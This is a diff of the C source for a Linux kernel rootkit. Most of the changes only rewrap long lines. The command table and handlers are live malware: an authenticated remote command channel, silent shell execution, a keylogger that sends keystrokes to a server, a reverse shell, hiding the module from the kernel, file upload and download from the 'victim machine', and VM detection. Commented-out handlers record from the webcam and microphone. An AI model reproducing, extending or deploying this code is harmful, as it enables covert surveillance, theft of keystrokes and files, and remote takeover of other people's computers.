@@ -45,28 +45,38 @@ static int sysinfo_handler(char *args, enum Protocol protocol);
 static int is_in_vm_handler(char *args, enum Protocol protocol);
 
 static struct command rootkit_commands_array[] = {
-    { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 51, connect_handler },
+    { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 51,
+      connect_handler },
     { "disconnect", 10, "disconnect user", 15, disconnect_handler },
     { "ping", 4, "ping the rootkit", 16, ping_handler },
-    { "passwd", 6, "change rootkit password. Usage: passwd NEW_PASSWORD", 51, change_password_handler },
-    { "exec", 4, "execute a shell command. Usage: exec [-s for silent mode] [args*]", 65, exec_handler },
+    { "passwd", 6, "change rootkit password. Usage: passwd NEW_PASSWORD", 51,
+      change_password_handler },
+    { "exec", 4,
+      "execute a shell command. Usage: exec [-s for silent mode] [args*]", 65,
+      exec_handler },
     { "klgon", 6, "activate keylogger", 18, klgon_handler },
     { "klgoff", 7, "deactivate keylogger", 20, klgoff_handler },
     { "klg", 3, "send keylogger content to server", 32, klg_handler },
     { "getshell", 8, "launch reverse shell", 20, getshell_handler },
     { "killcom", 7, "exit the module", 15, killcom_handler },
-    { "hide_module", 11, "hide the module from the kernel", 31, hide_module_handler },
-    { "unhide_module", 13, "unhide the module in the kernel", 31, unhide_module_handler },
+    { "hide_module", 11, "hide the module from the kernel", 31,
+      hide_module_handler },
+    { "unhide_module", 13, "unhide the module in the kernel", 31,
+      unhide_module_handler },
     { "help", 4, "display this help message", 25, help_handler },
     //    { "start_webcam", 11, "activate webcam", 15, start_webcam_handler },
-    //    { "capture_image", 13, "capture an image with the webcam", 32, capture_image_handler },
-    //    { "start_microphone", 15, "start recording from microphone", 31, start_microphone_handler },
-    //    { "play_audio", 10, "play an audio file", 18, play_audio_handler },
+    //    { "capture_image", 13, "capture an image with the webcam", 32,
+    //    capture_image_handler }, { "start_microphone", 15, "start recording
+    //    from microphone", 31, start_microphone_handler }, { "play_audio", 10,
+    //    "play an audio file", 18, play_audio_handler },
     { "hooks", 5, "manage hide/forbid/alter rules", 30, hooks_menu_handler },
     { "upload", 6, "receive a file and save it on disk", 34, upload_handler },
-    { "download", 8, "download a file from victim machine", 35, download_handler },
-    { "sysinfo", 7, "get system information in JSON format", 37, sysinfo_handler },
-    { "is_in_vm", 8, "check if remote rootkit is running in vm", 40, is_in_vm_handler },
+    { "download", 8, "download a file from victim machine", 35,
+      download_handler },
+    { "sysinfo", 7, "get system information in JSON format", 37,
+      sysinfo_handler },
+    { "is_in_vm", 8, "check if remote rootkit is running in vm", 40,
+      is_in_vm_handler },
     { NULL, 0, NULL, 0, NULL }
 };
 
@@ -74,10 +84,12 @@ static int is_in_vm_handler(char *args, enum Protocol protocol) {
     (void)args;
 
     if (is_running_in_virtual_env()) {
-        send_to_server(protocol, "[YES] The rootkit is running in a virtual machine.\n");
+        send_to_server(protocol,
+                       "[YES] The rootkit is running in a virtual machine.\n");
     }
     else {
-        send_to_server(protocol, "[NOP] The rootkit is not running in a virtual machine.\n");
+        send_to_server(protocol,
+                       "[NOP] The rootkit is not running in a virtual machine.\n");
     }
     return SUCCESS;
 }
@@ -87,8 +99,9 @@ static int help_handler(char *args, enum Protocol protocol) {
     char *help_msg = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
     int offset = snprintf(help_msg, STD_BUFFER_SIZE, "Available commands:\n");
     for (i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
-        offset += snprintf(help_msg + offset, STD_BUFFER_SIZE - offset, "\t - %s: %s\n",
-                           rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_desc);
+        offset += snprintf(help_msg + offset, STD_BUFFER_SIZE - offset,
+                           "\t - %s: %s\n", rootkit_commands_array[i].cmd_name,
+                           rootkit_commands_array[i].cmd_desc);
         if (offset >= STD_BUFFER_SIZE) {
             ERR_MSG("help_handler: help message truncated\n");
             break;
@@ -102,7 +115,8 @@ static int help_handler(char *args, enum Protocol protocol) {
     return 0;
 }
 
-int rootkit_command(char *command, unsigned command_size, enum Protocol protocol) {
+int rootkit_command(char *command, unsigned command_size,
+                    enum Protocol protocol) {
     // Handle ongoing download
     if (download(command) == 0) {
         return 0;
@@ -131,7 +145,8 @@ int rootkit_command(char *command, unsigned command_size, enum Protocol protocol
         }
 
         if (!allowed) {
-            send_to_server(protocol, "Authentication required. Use the 'connect' command to authenticate.\n");
+            send_to_server(protocol, "Authentication required. Use the 'connect' "
+                                     "command to authenticate.\n");
             ERR_MSG("rootkit_command: unauthorized command without authentication\n");
             return -FAILURE;
         }
@@ -266,17 +281,22 @@ static int exec_handler(char *args, enum Protocol protocol) {
         }
 
         char code_msg[32] = { 0 };
-        snprintf(code_msg, sizeof(code_msg), "Terminated with code: %d\n", ret_code);
+        snprintf(code_msg, sizeof(code_msg), "Terminated with code: %d\n",
+                 ret_code);
 
-        char *output_msg = kmalloc(stdout_buff_size + stderr_buff_size + sizeof(stdout_msg) + sizeof(stderr_msg) + sizeof(code_msg), GFP_KERNEL);
+        char *output_msg =
+            kmalloc(stdout_buff_size + stderr_buff_size + sizeof(stdout_msg) + sizeof(stderr_msg) + sizeof(code_msg),
+                    GFP_KERNEL);
         if (!output_msg) {
             ERR_MSG("exec_handler: failed to allocate memory for output message\n");
             kfree(stdout_buff);
             kfree(stderr_buff);
             return -ENOMEM;
         }
-        snprintf(output_msg, stdout_buff_size + stderr_buff_size + sizeof(stdout_msg) + sizeof(stderr_msg) + sizeof(code_msg),
-                 "%s%s%s%s%s", stdout_msg, stdout_buff, stderr_msg, stderr_buff, code_msg);
+        snprintf(output_msg,
+                 stdout_buff_size + stderr_buff_size + sizeof(stdout_msg) + sizeof(stderr_msg) + sizeof(code_msg),
+                 "%s%s%s%s%s", stdout_msg, stdout_buff, stderr_msg, stderr_buff,
+                 code_msg);
 
         send_to_server(protocol, output_msg);
         kfree(output_msg);
@@ -286,7 +306,8 @@ static int exec_handler(char *args, enum Protocol protocol) {
     else {
         // If not catching stds, just send the return code
         char ret_code_msg[32] = { 0 };
-        snprintf(ret_code_msg, sizeof(ret_code_msg), "Terminated with code: %d\n", ret_code);
+        snprintf(ret_code_msg, sizeof(ret_code_msg), "Terminated with code: %d\n",
+                 ret_code);
         send_to_server(protocol, ret_code_msg);
     }
 
@@ -294,7 +315,7 @@ static int exec_handler(char *args, enum Protocol protocol) {
 }
 
 static int klgon_handler(char *args, enum Protocol protocol) {
-    int ret_code = epikeylog_init(0);
+    int ret_code = epikeylog_init();
     if (ret_code < 0) {
         ERR_MSG("klgon_handler: failed to activate keylogger\n");
         send_to_server(protocol, "");
@@ -334,7 +355,8 @@ static int getshell_handler(char *args, enum Protocol protocol) {
     args[strcspn(args, "\n")] = '\0';
     // check if all chars are numbers
     if (args[0] == '\0') {
-        DBG_MSG("getshell_handler: no port specified, using default port %d\n", REVERSE_SHELL_PORT);
+        DBG_MSG("getshell_handler: no port specified, using default port %d\n",
+                REVERSE_SHELL_PORT);
         args = "0";
     }
     long shellport = simple_strtol(args, NULL, 10);
@@ -348,12 +370,15 @@ static int getshell_handler(char *args, enum Protocol protocol) {
     int ret_code = launch_reverse_shell(args);
 
     if (ret_code < 0) {
-        ERR_MSG("getshell_handler: failed to launch reverse shell on port %ld\n", shellport);
+        ERR_MSG("getshell_handler: failed to launch reverse shell on port %ld\n",
+                shellport);
         send_to_server(protocol, "Failed to launch reverse shell\n");
     }
 
     else
-        send_to_server(protocol, "Reverse shell launched successfully on port %ld\n", shellport);
+        send_to_server(protocol,
+                       "Reverse shell launched successfully on port %ld\n",
+                       shellport);
 
     return ret_code;
 }
@@ -401,39 +426,44 @@ static int unhide_module_handler(char *args, enum Protocol protocol) {
 /*
 static int start_webcam_handler(char *args, enum Protocol protocol) {
     DBG_MSG("start_webcam_handler: starting webcam to capture an image\n");
-    static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
-    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+    static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i",
+"/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2",
+"/tmp/capture.jpg", NULL }; static char *envp[] = { "HOME=/",
+"PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
     int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
     if (ret_code < 0) {
         ERR_MSG("start_webcam_handler: failed to start webcam\n");
         return ret_code;
     }
-    DBG_MSG("start_webcam_handler: webcam started successfully, image captured\n");
-    send_to_server(protocol, "Webcam activated and image captured\n");
+    DBG_MSG("start_webcam_handler: webcam started successfully, image
+captured\n"); send_to_server(protocol, "Webcam activated and image captured\n");
     return SUCCESS;
 }
 
 static int capture_image_handler(char *args, enum Protocol protocol) {
     DBG_MSG("capture_image_handler: capturing an image from the webcam\n");
-    static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
-    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+    static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i",
+"/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2",
+"/tmp/capture.jpg", NULL }; static char *envp[] = { "HOME=/",
+"PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
     int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
     if (ret_code < 0) {
         ERR_MSG("capture_image_handler: failed to capture image\n");
         return ret_code;
     }
-    DBG_MSG("capture_image_handler: image captured successfully, saved at /tmp/capture.jpg\n");
-    send_to_server(protocol, "Captured image saved at /tmp/capture.jpg\n");
+    DBG_MSG("capture_image_handler: image captured successfully, saved at
+/tmp/capture.jpg\n"); send_to_server(protocol, "Captured image saved at
+/tmp/capture.jpg\n");
 
 
     // Copy the image to a directory accessible by Flask
     // For example, to /var/www/html/images/ on the server
-    int copy_ret_code = system("cp /tmp/capture.jpg /var/www/html/images/capture.jpg");
-    if (copy_ret_code < 0) {
-        ERR_MSG("capture_image_handler: failed to copy image to web accessible directory\n");
-        return copy_ret_code;
+    int copy_ret_code = system("cp /tmp/capture.jpg
+/var/www/html/images/capture.jpg"); if (copy_ret_code < 0) {
+        ERR_MSG("capture_image_handler: failed to copy image to web accessible
+directory\n"); return copy_ret_code;
     }
 
     return SUCCESS;
@@ -441,23 +471,25 @@ static int capture_image_handler(char *args, enum Protocol protocol) {
 
 static int start_microphone_handler(char *args, enum Protocol protocol) {
     DBG_MSG("start_microphone_handler: starting microphone recording\n");
-    static char *argv[] = { "/usr/bin/arecord", "-D", "plughw:1,0", "-f", "cd", "-t", "wav", "-d", "10", "/tmp/audio.wav", NULL };
-    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+    static char *argv[] = { "/usr/bin/arecord", "-D", "plughw:1,0", "-f", "cd",
+"-t", "wav", "-d", "10", "/tmp/audio.wav", NULL }; static char *envp[] = {
+"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
     int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
     if (ret_code < 0) {
         ERR_MSG("start_microphone_handler: failed to start microphone\n");
         return ret_code;
     }
-    DBG_MSG("start_microphone_handler: microphone recording started successfully, audio saved at /tmp/audio.wav\n");
-    send_to_server(protocol, "Microphone activated and audio recorded\n");
-    return SUCCESS;
+    DBG_MSG("start_microphone_handler: microphone recording started
+successfully, audio saved at /tmp/audio.wav\n"); send_to_server(protocol,
+"Microphone activated and audio recorded\n"); return SUCCESS;
 }
 
 static int play_audio_handler(char *args, enum Protocol protocol) {
     DBG_MSG("play_audio_handler: playing audio file from /tmp/audio.wav\n");
     static char *argv[] = { "/usr/bin/aplay", "/tmp/audio.wav", NULL };
-    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL
+};
 
     int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
     if (ret_code < 0) {
